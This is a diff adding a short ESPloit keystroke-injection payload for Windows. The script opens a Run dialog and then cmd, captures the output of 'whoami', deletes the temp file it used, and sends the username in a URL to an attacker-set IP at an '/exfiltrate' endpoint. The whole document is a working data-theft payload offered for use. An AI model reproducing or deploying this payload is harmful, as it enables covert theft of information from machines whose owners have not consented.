@@ -1,0 +1,8 @@
+Rem: Exfiltrate UserName from Windows Box
+Rem: ESPloit and Target must be connected to the same network for this to work
+Rem: Set the IP of ESPloit below by changing "SET ip=192.168.1.1"
+Press:131+114
+PrintLine:cmd
+PrintLine:whoami>tmp& SET /P data=&lt;tmp& del tmp& SET file=WinUser.txt& SET ip=192.168.1.1
+PrintLine:SET url=^"http:///%ip%/exfiltrate^?file^=%file%^&data^=%data%^"
+PrintLine:explorer %url%&exit
